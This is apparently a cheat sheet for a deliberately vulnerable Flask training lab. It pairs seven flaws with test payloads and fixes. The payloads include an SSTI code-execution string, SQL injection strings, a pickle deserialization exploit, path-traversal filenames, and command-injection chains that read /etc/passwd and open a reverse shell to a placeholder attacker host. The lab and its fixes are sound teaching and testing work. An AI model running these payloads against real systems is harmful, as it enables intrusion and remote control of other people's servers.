# Vulnerability Testing Cheat Sheet

## Quick Reference for Security Testing

### VULN #1: Hardcoded Secret Key
**File:** `app.py` line 17  
**Severity:** 🔴 HIGH

**Finding:**
```python
app.config['SECRET_KEY'] = 'dev_secret_123'
```

**Impact:**
- Session forgery
- Authentication bypass
- Cookie manipulation

**Fix:**
```python
import os
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(32))
```

---

### VULN #2: Server-Side Template Injection (SSTI)
**Endpoint:** `/greet?name=<payload>`  
**Severity:** 🔴 CRITICAL

**Test Payloads:**
```
# Basic math injection
/greet?name={{7*7}}
Expected: "Hello 49!"

# Configuration disclosure
/greet?name={{config.items()}}
Expected: Shows Flask configuration

# Object inspection
/greet?name={{config.__class__}}

# RCE attempt (be careful!)
/greet?name={{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

**Fix:**
```python
# Use render_template with auto-escaping
return render_template('greet.html', name=name)
```

---

### VULN #3: SQL Injection
**Endpoint:** `/user/<user_id>`  
**Severity:** 🔴 CRITICAL

**Test Payloads:**
```
# Authentication bypass
/user/1 OR 1=1

# Union-based injection
/user/1 UNION SELECT 1,2,3,4,5,6

# Comment-based injection
/user/1--

# Boolean-based blind SQLi
/user/1 AND 1=1
/user/1 AND 1=2

# Time-based blind SQLi (SQLite)
/user/1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END)
```

**What you can extract:**
- All user passwords
- Database structure
- Other tables

**Fix:**
```python
# Use parameterized queries
query = "SELECT * FROM users WHERE id = ?"
result = conn.execute(query, (user_id,)).fetchone()
```

---

### VULN #4: Path Traversal / Unrestricted File Upload
**Endpoint:** `/upload`  
**Severity:** 🔴 HIGH

**Test Cases:**
1. **Path Traversal:**
   - Filename: `../../../test.txt`
   - Filename: `..\..\..\..\windows\system32\test.txt`

2. **Malicious Files:**
   - Upload: `shell.php`
   - Upload: `malware.exe`
   - Upload: `exploit.jsp`

3. **File Extension Bypass:**
   - `file.php.jpg`
   - `file.PhP`
   - `file.php%00.jpg`

**Fix:**
```python
import os
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

if file and allowed_file(file.filename):
    filename = secure_filename(file.filename)
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
```

---

### VULN #5: Insecure Deserialization (Pickle)
**Endpoint:** `/session/load`  
**Severity:** 🔴 CRITICAL

**Exploit Concept:**
```python
import pickle
import base64
import os

# Malicious payload that executes code
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

malicious = base64.b64encode(pickle.dumps(Exploit()))
# Set this as session_data cookie
```

**How to Test:**
1. Visit `/session/save` to see normal pickle data
2. Inspect the `session_data` cookie (base64 encoded pickle)
3. Craft malicious pickle payload
4. Replace cookie and visit `/session/load`

**Fix:**
```python
import json

# Use JSON instead of pickle
data = {'user': 'guest', 'role': 'user'}
cookie_data = base64.b64encode(json.dumps(data).encode()).decode()

# Loading
data = json.loads(base64.b64decode(cookie_data))
```

---

### VULN #6: Command Injection
**Endpoint:** `/command`  
**Severity:** 🔴 CRITICAL

**Test Payloads (Windows):**
```
# Simple commands
whoami
dir
ipconfig

# Command chaining
dir & whoami
dir && whoami
dir | whoami

# Multiple commands
dir & ipconfig & whoami

# File reading
type app.py
type README.md

# Network reconnaissance
ipconfig /all
netstat -an
```

**Test Payloads (Unix/Linux):**
```
# Simple commands
whoami
ls -la
pwd

# Command chaining
ls -la; whoami
ls -la && whoami
ls -la | whoami

# File reading
cat app.py
cat /etc/passwd

# Reverse shell (be careful!)
nc -e /bin/sh attacker-ip 4444
```

**Fix:**
```python
# DON'T execute arbitrary commands!
# Use allowed-list approach with subprocess

import subprocess
ALLOWED_COMMANDS = {
    'status': ['systemctl', 'status', 'myapp'],
    'version': ['python', '--version']
}

if cmd in ALLOWED_COMMANDS:
    result = subprocess.run(ALLOWED_COMMANDS[cmd], 
                          capture_output=True, 
                          text=True,
                          timeout=5)
    return result.stdout
```

---

### VULN #7: Debug Mode in Production
**Location:** Application startup  
**Severity:** 🔴 HIGH

**How to Trigger:**
1. Cause an error in the application
2. Interactive debugger will be available in browser
3. Can execute Python code
4. View source code and environment variables

**What's Exposed:**
- Full stack traces with code
- Environment variables
- Source code paths
- Interactive Python console (with PIN)

**Fix:**
```python
# Production configuration
if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)

# Or use environment variable
import os
debug_mode = os.environ.get('FLASK_DEBUG', 'False') == 'True'
app.run(debug=debug_mode)
```

---

## 🔧 Testing Tools

### Recommended Tools:
1. **Burp Suite** - Intercept and modify requests
2. **OWASP ZAP** - Automated vulnerability scanning
3. **SQLMap** - Automated SQL injection testing
4. **curl** - Command-line HTTP testing
5. **Postman** - API testing

### Example curl Commands:
```bash
# Test SSTI
curl "http://127.0.0.1:5000/greet?name={{7*7}}"

# Test SQL Injection
curl "http://127.0.0.1:5000/user/1%20OR%201=1"

# Test file upload
curl -X POST -F "file=@malicious.txt" http://127.0.0.1:5000/upload

# Test command injection
curl -X POST -d "cmd=whoami" http://127.0.0.1:5000/command
```

---

## 📊 Risk Assessment

| Vulnerability | Severity | CVSS | Exploitability |
|--------------|----------|------|----------------|
| SSTI | CRITICAL | 9.8 | Easy |
| SQL Injection | CRITICAL | 9.8 | Easy |
| Command Injection | CRITICAL | 9.8 | Easy |
| Insecure Deserialization | CRITICAL | 9.8 | Medium |
| Unrestricted File Upload | HIGH | 8.1 | Easy |
| Hardcoded Secrets | HIGH | 7.5 | Easy |
| Debug Mode | HIGH | 7.5 | Easy |

---

## 🎓 Learning Path

1. **Start with reconnaissance** - Explore the application normally
2. **Read the source code** - Understand how each vulnerability works
3. **Use browser dev tools** - Inspect requests and responses
4. **Try basic exploits** - Test with simple payloads
5. **Use security tools** - Automate discovery with scanners
6. **Practice remediation** - Fix each vulnerability
7. **Write secure code** - Implement proper security controls

---

## ⚠️ Safety Notice

**Remember:**
- Only test on applications you own or have permission to test
- This lab is for educational purposes only
- Never use these techniques maliciously
- Always practice responsible disclosure

---

## 📚 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacker101](https://www.hacker101.com/)
- [PentesterLab](https://pentesterlab.com/)
